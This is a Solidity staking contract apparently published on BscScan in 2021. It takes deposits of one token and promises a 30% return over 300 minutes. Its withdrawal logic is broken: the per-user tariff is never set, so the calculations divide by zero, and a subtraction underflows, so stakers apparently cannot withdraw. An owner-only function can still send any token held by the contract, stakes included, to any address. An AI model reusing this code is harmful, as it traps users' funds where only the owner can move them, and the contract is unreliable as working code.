/**
 *Submitted for verification at BscScan.com on 2021-07-23
*/

// SPDX-License-Identifier: none
pragma solidity ^0.8.6;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Stake {

  struct Tariff {
    uint time;
    uint percent;
  }

  struct Investor {
    bool hasStaked;  
    uint[] invested;
    uint[] investedAt;
    uint[] withdrawnRoi;
    uint[] totalWithdraw;
    uint[] principalWithdrawnAt;
    bool[] principalWithdrawn;
  }

  address public owner;
  address tokenAddr = 0x8691BB7E4f4d299716850bE908df9F8e002dED16;
  address contractAddr = address(this);

  Tariff[] public tariffs;

  uint public totalInvestors;
  uint public totalInvested;
  uint public totalWithdrawal;

  mapping (address => Investor) investors;
  mapping (address => Tariff) public tariff;
  
  event DepositAt(address user, uint amount);
  event Withdraw(address user, uint amount);
  event TransferOwnership(address user);
  event Received(address, uint);

    constructor()  {
        tariffs.push(Tariff(300 minutes, 30));
        owner = msg.sender;
    }
    
    // Stake tokens on the contract
    function deposit(uint tokenAmount) public {
        
        IERC20 token = IERC20(tokenAddr);
        require(tokenAmount > 10000000000000000000, "Stake amount not sufficient");
        require(token.balanceOf(msg.sender) > 0, "Not enough balance of user");
        token.approve(contractAddr, tokenAmount);
        token.transferFrom(msg.sender, contractAddr, tokenAmount);
      
        if(investors[msg.sender].hasStaked == false){
            totalInvestors++;
        }
        investors[msg.sender].hasStaked = true;
        investors[msg.sender].invested.push(tokenAmount);
        investors[msg.sender].investedAt.push(block.timestamp);
        investors[msg.sender].withdrawnRoi.push(0);
        investors[msg.sender].totalWithdraw.push(0);
        investors[msg.sender].principalWithdrawnAt.push(0);
        investors[msg.sender].principalWithdrawn.push(false);
            
        totalInvested += tokenAmount;
    
        emit DepositAt(msg.sender, tokenAmount);
    }
    
    // View withdrawable ROI
    function withdrawableView(address user) public view returns (uint[] memory amount) {
        Investor storage investor = investors[user];
        uint len = investor.invested.length;
        amount = new uint[](len);
        for(uint i = 0; i < len; i++){
            
            Tariff storage tariffNew = tariff[user];
            
            uint finish = investor.invested[i] + tariffNew.time;
            uint since = investor.investedAt[i];
            uint till = block.timestamp > finish ? finish : block.timestamp;
            
            if(investor.principalWithdrawn[i] == true){
                amount[i] = 0;
            }
            else if(investor.principalWithdrawnAt[i] - investor.investedAt[i] < 3 minutes){
                amount[i] = 0;
            }
            else{
                amount[i] = ( investor.invested[i] ) * ( till - since ) * tariffNew.percent / tariffNew.time / 100;
                amount[i] = amount[i] - investor.withdrawnRoi[i];
            }
        }
        
    }
   
  
    // WithdrawROI
    function withdrawROI(uint i) public {
        
        uint amount;
        address user = msg.sender;
        Investor storage investor = investors[user];
            
        require(investor.principalWithdrawn[i] == false, "Already withdrawn");
        require(investor.principalWithdrawnAt[i] - investor.investedAt[i] > 3 minutes, "Not eligible");
        Tariff storage tariffNew = tariff[user];
        
        uint finish = investor.invested[i] + tariffNew.time;
        uint since = investor.investedAt[i];
        uint till = block.timestamp > finish ? finish : block.timestamp;
        
        if(till - since >= 3 minutes){
            amount = ( investor.invested[i] ) * ( till - since ) * tariffNew.percent / tariffNew.time / 100;
            amount = amount - investor.withdrawnRoi[i];
        }
        
        else{
            revert("Time not reached");
        }
        
        investor.withdrawnRoi[i] += amount;
        investor.totalWithdraw[i] += amount;
        
        IERC20 token = IERC20(tokenAddr);
        address to = msg.sender;
        token.transfer(to, amount);
        
        totalWithdrawal += amount;

        emit Withdraw(to, amount);
    }
  
    // Principal withdraw wtih ROI(if any left)
    function principalWithdraw(uint i) public {
        
        uint amount;
        address user = msg.sender;
        Investor storage investor = investors[user];
            
        Tariff storage tariffNew = tariff[user];
        
        uint finish = investor.invested[i] + tariffNew.time;
        uint since = investor.investedAt[i];
        uint till = block.timestamp > finish ? finish : block.timestamp;
        
        amount = ( investor.invested[i] ) * ( till - since ) * tariffNew.percent / tariffNew.time / 100;
        amount = amount - investor.withdrawnRoi[i];
        amount = amount + investor.invested[i];
        
        investor.totalWithdraw[i] += amount;
        investor.principalWithdrawn[i] = true;
        investor.principalWithdrawnAt[i] = block.timestamp;
        
        IERC20 token = IERC20(tokenAddr);
        
        token.transfer(msg.sender, amount);
        totalWithdrawal += amount;
        
        emit Withdraw(msg.sender, amount);
    }
  
    // View user details
    function myData(address userAddr) public view returns (bool staked, uint[] memory invested, uint[] memory investedAt, uint[] memory withdrawnRoi, uint[] memory totalWithdraw, bool[] memory principalWithdrawn) {
        Investor storage investor = investors[userAddr];
        staked = investor.hasStaked;
        uint len = investor.invested.length;
        invested = new uint[](len);
        investedAt = new uint[](len);
        withdrawnRoi = new uint[](len);
        totalWithdraw = new uint[](len);
        principalWithdrawn = new bool[](len);
        
        for(uint i = 0; i < len; i++){
            invested[i] = investor.invested[i];
            investedAt[i] = investor.investedAt[i];
            withdrawnRoi[i] = investor.withdrawnRoi[i];
            totalWithdraw[i] = investor.totalWithdraw[i];
            principalWithdrawn[i] = investor.principalWithdrawn[i];
        }
        
        return (staked, invested, investedAt, withdrawnRoi, totalWithdraw, principalWithdrawn);
    }
    
    // Owner only token withdraw
    function withdrawToken(address tokenAddress, address to, uint amount) public {
        require(msg.sender == owner, "Only owner");
        IERC20 token = IERC20(tokenAddress);
        token.transfer(to, amount);
    }  
    
    // Owner only BNB withdraw
    function withdrawBNB(address payable to, uint amount) public {
        require(msg.sender == owner, "Only owner");
        to.transfer(amount);
    }
  
    // Transfer ownership. Only owner can call this
    function transferOwnership(address to) public {
        require(msg.sender == owner, "Only owner");
        owner = to;
        emit TransferOwnership(owner);
    }
    
    // Receive BNB function
    receive() external payable {
        emit Received(msg.sender, msg.value);
    }  
    
}